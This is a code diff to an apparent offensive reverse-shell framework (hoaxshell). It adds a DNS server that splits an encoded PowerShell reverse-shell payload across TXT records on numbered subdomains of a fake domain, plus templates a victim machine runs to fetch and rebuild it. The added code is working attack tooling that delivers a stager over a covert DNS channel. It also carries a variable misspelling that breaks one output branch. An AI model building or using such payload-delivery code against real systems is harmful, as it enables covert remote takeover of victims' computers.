@@ -16,6 +16,11 @@ from subprocess import check_output, Popen, PIPE
 from string import ascii_uppercase, ascii_lowercase
 from platform import system as get_system_type
 from random import randint
+import traceback
+import socketserver
+import struct
+from textwrap import wrap
+from dnslib import *
 
 filterwarnings("ignore", category = DeprecationWarning)
 
@@ -103,6 +108,10 @@ parser.add_argument("-t", "--trusted-domain", action="store_true", help = "If yo
 parser.add_argument("-cm", "--constraint-mode", action="store_true", help="Generate a payload that works even if the victim is configured to run PS in Constraint Language mode. By using this option, you sacrifice a bit of your reverse shell's stdout decoding accuracy.")
 parser.add_argument("-lt", "--localtunnel", action="store_true", help="Generate Payload with localtunnel")
 parser.add_argument("-ng", "--ngrok", action="store_true",help="Generate Payload with Ngrok")
+parser.add_argument("-dns", "--dns-server", action="store_true", help="Transmit payload over DNS")
+parser.add_argument("-d", "--domain", action="store", help="Fake domain name for DNS server - only used with -dns")
+parser.add_argument("--tcp", action="store_true", help="Start dns server in tcp mode - only used with -dns")
+parser.add_argument("--udp", action="store_true", help="Start dns server in udp mode - only used with -dns")
 parser.add_argument("-u", "--update", action="store_true", help = "Pull the latest version from the original repo.")
 parser.add_argument("-q", "--quiet", action="store_true", help = "Do not print the banner on startup.")
 
@@ -182,8 +191,9 @@ def promptHelpMsg():
 
 
 def encodePayload(payload):
-	enc_payload = "powershell -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
-	print(f'{PLOAD}{enc_payload}{END}')
+	'''Encoded Paylaod'''
+	enc_payload = base64.b64encode(payload.encode('utf16')[2:]).decode()
+	return enc_payload
 
 
 
@@ -307,6 +317,146 @@ class Tunneling:
 		self.process.kill() #Terminate running tunnel process
 		print(f'\r[{WARN}] Tunnel terminated.')
 
+#--------------- DNS Server ------------------- #
+
+class DNSServer:
+	'''DNS Server'''
+	def __init__(self, domain):
+		self.domain = domain
+		self.IP = '127.0.0.1'
+		self.TTL = 60 * 5
+		self.records = {}
+		self.ns_records = None
+		self.soa_record = None
+		self.range = None
+	
+	def prepare(self, payload):
+		'''Prepare DNS Server Records'''
+		TXT_PAYLAOD = wrap(payload, 255)  # TXT records have limit of 255 characters
+		self.range = len(TXT_PAYLAOD)
+		for i, txt_record in enumerate(TXT_PAYLAOD):
+
+			SubDomain = DomainName('{}.{}'.format(i+1, self.domain))
+			self.soa_record = SOA(
+				mname=SubDomain.ns1,  # primary name server
+				rname=SubDomain.magnito,  # email of the domain administrator
+				times=(
+					201307231,  # serial number
+					60 * 60 * 1,  # refresh
+					60 * 60 * 3,  # retry
+					60 * 60 * 24, # expire
+					60 * 60 * 1,  # minimum
+				)
+			)
+			self.ns_records = [NS(SubDomain.ns1), NS(SubDomain.ns2)]
+			self.records.update({
+				SubDomain: [A(self.IP), AAAA((0,) * 16), MX(SubDomain.mail), TXT(txt_record), self.soa_record] + self.ns_records,
+				# MX and NS records must never point to a CNAME alias (RFC 2181 section 10.3)
+				SubDomain.ns1: [A(self.IP)],
+				SubDomain.ns2: [A(self.IP)],
+				SubDomain.mail: [A(self.IP)],
+				SubDomain.andrei: [CNAME(SubDomain)],
+			})
+
+	def get_range(self):
+		'''Subdomain Ranges'''
+		return self.range
+
+	def start(self):
+		'''Start DNS Server'''
+		servers = []
+
+		if args.udp:
+			servers.append(socketserver.ThreadingUDPServer(
+				('', 53), UDPRequestHandler))
+		if args.tcp:
+			servers.append(socketserver.ThreadingTCPServer(
+				('', 53), TCPRequestHandler))
+
+		for s in servers:
+			# that thread will start one more thread for each request
+			thread = Thread(target=s.serve_forever)
+			thread.daemon = True  # exit the server thread when the main thread terminates
+			thread.start()
+			print(f"[{INFO}] DNS {ORANGE}{s.RequestHandlerClass.__name__[:3]}{END} server loop running in thread: {ORANGE}{thread.name}{END}")
+
+
+class DomainName(str):
+	'''Domain Name'''
+	def __getattr__(self, item):
+		return DomainName(item + '.' + self)
+
+
+class BaseRequestHandler(socketserver.BaseRequestHandler):
+	'''Base Request Handler'''
+
+	def get_data(self):
+		raise NotImplementedError
+
+	def send_data(self, data):
+		raise NotImplementedError
+
+	def handle(self):
+		try:
+			data = self.get_data()
+			self.send_data(self.dns_response(data))
+		except Exception:
+			traceback.print_exc(file=sys.stderr)
+
+	def dns_response(self, data):
+		request = DNSRecord.parse(data)
+
+		reply = DNSRecord(DNSHeader(id=request.header.id,
+									qr=1, aa=1, ra=1), q=request.q)
+
+		qname = request.q.qname
+		qn = str(qname)
+		qtype = request.q.qtype
+		qt = QTYPE[qtype]
+
+		if qn == DNSserver.domain or qn.endswith('.' + DNSserver.domain):
+
+			for name, rrs in DNSserver.records.items():
+				if name == qn:
+					for rdata in rrs:
+						rqt = rdata.__class__.__name__
+						if qt in ['*', rqt]:
+							reply.add_answer(RR(rname=qname, rtype=getattr(
+								QTYPE, rqt), rclass=1, ttl=DNSserver.TTL, rdata=rdata))
+
+			for rdata in DNSserver.ns_records:
+				reply.add_ar(RR(rname=qn, rtype=QTYPE.NS,
+								rclass=1, ttl=DNSserver.TTL, rdata=rdata))
+
+			reply.add_auth(RR(rname=qn, rtype=QTYPE.SOA,
+								rclass=1, ttl=DNSserver.TTL, rdata=DNSserver.soa_record))
+
+		return reply.pack()
+
+
+class TCPRequestHandler(BaseRequestHandler):
+
+    def get_data(self):
+        data = self.request.recv(8192).strip()
+        sz = struct.unpack('>H', data[:2])[0]
+        if sz < len(data) - 2:
+            raise Exception("Wrong size of TCP packet")
+        elif sz > len(data) - 2:
+            raise Exception("Too big TCP packet")
+        return data[2:]
+
+    def send_data(self, data):
+        sz = struct.pack('>H', len(data))
+        return self.request.sendall(sz + data)
+
+
+class UDPRequestHandler(BaseRequestHandler):
+
+    def get_data(self):
+        return self.request[0].strip()
+
+    def send_data(self, data):
+        return self.request[1].sendto(data, self.client_address)
 
 # -------------- Hoaxshell Server -------------- #
 class Hoaxshell(BaseHTTPRequestHandler):
@@ -604,8 +754,15 @@ def main():
 			for char in args.Header:
 				if char not in valid:
 					 exit_with_msg('Header name includes illegal characters.')
-		
-		
+					 
+		global DNSserver
+		if args.dns_server and not (args.localtunnel or args.ngrok):
+			if not args.domain or not (args.tcp or args.udp):
+				exit_with_msg('DNS server requires a domain name (-d, --domain) and a valid protocol (--tcp or --udp).')
+
+			DNSserver = DNSServer((args.domain if args.domain.endswith('.') else args.domain+'.'))
+
+
 		# Check if http/https
 		if ssl_support:
 			server_port = int(args.port) if args.port else 443
@@ -701,8 +858,31 @@ def main():
 					
 					payload = payload.replace(var, f'${obf}')
 			
-			
-			encodePayload(payload) if not args.raw_payload else print(f'{PLOAD}{payload}{END}')
+			enc_payload = encodePayload(payload)
+
+			if args.raw_payload:
+				print(f'{PLOAD}{payload}{END}')
+			elif not args.dns_server:
+				paylaod = "powershell -e "+enc_payload
+				print(f'{PLOAD}{payload}{END}')
+			else:
+				DNSserver.prepare(enc_payload)
+				range = DNSserver.get_range() #Payload chunk counts for subdomain generation
+				DNSserver.start() #starting DNS server
+				if not (args.tcp and args.udp):
+					DnsPayload = open(f'{cwd}/payload_templates/https_payload_dns_udp.ps1', 'r') if not args.tcp else open(
+							f'{cwd}/payload_templates/https_payload_dns_tcp.ps1', 'r')
+					payload = DnsPayload.read().strip()
+					DnsPayload.close()
+				else:
+					TcpPayload = open(f'{cwd}/payload_templates/https_payload_dns_tcp.ps1', 'r').read().strip()
+					UdpPayload = open(f'{cwd}/payload_templates/https_payload_dns_udp.ps1', 'r').read().strip()
+					payload = f'{END}[{INFO}] Payload for {MAIN}TCP{END} baesd DNS Lookup\n{PLOAD}{TcpPayload}{END}\n{END}[{INFO}] Payload for {MAIN}UDP{END} baesd DNS Lookup\n{PLOAD}{UdpPayload}{END}'
+
+				payload = payload.replace('*SERVERIP*', args.server_ip).replace(
+					'*DOMAIN*', args.domain).replace('*RANGE*', str(range))
+				print(f'{PLOAD}{payload}{END}')
+
 
 			print(f'[{INFO}] Tunneling [{BOLD}{ORANGE}ON{END}]') if tunneling else chill()
 			
@@ -731,7 +911,7 @@ def main():
 					system('clear')
 
 				elif user_input.lower() in ['payload']:
-					encodePayload(payload)
+					print(f'{PLOAD}{payload}{END}')
 
 				elif user_input.lower() in ['rawpayload']:
 					print(f'{PLOAD}{payload}{END}')
